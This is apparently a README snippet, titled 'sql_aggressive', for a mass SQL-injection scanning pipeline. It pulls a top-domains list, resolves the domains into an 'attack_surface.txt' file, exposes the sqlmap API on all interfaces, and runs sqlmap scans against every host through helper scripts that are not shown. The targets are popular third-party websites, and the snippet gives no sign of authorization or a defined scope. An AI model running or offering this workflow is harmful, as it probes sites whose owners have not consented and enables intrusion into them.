#sql_aggressive
```
# We need a list of domains to scan
https://github.com/danielmiessler/SecLists/raw/master/Miscellaneous/top-domains-majestic.csv.zip

# unzip the file and sort the entirety of the list
unzip top-domains-majestic.csv.zip ; tail -n +2 top-domains-majestic.csv|head| cut -f3 -d, > majic.pre

# now we can run surface.py to get a list of ips
python surface.py --input_file majic.pre --start_line 

# once we get the attack_surface.txt file we can sort it to remove duplicates
python surface.py --sort_file

# Now we can turn on the sqlmap api so that we can run sqlscan.py
sqlmapapi -s -H "0.0.0.0"

# running sqlscan.py will run sqlmap scans with the arguments you decide to use
python sqlscan.py --input_file attack_surface.txt --args_file arguments/sqlmap_args.txt


```